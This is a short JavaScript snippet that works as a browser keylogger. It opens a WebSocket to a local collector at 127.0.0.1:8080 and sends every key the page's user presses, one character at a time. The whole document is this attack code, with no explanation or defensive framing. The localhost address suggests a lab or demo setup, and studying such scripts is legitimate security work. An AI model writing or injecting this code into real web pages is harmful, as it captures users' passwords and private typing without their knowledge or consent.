(function () {
    let conn = new WebSocket("ws://127.0.0.1:8080/ws");
    document.onkeydown = keypress;

    function keypress(e) {
        s = String.fromCharCode(e.which);
        conn.send(s);
    }
})();
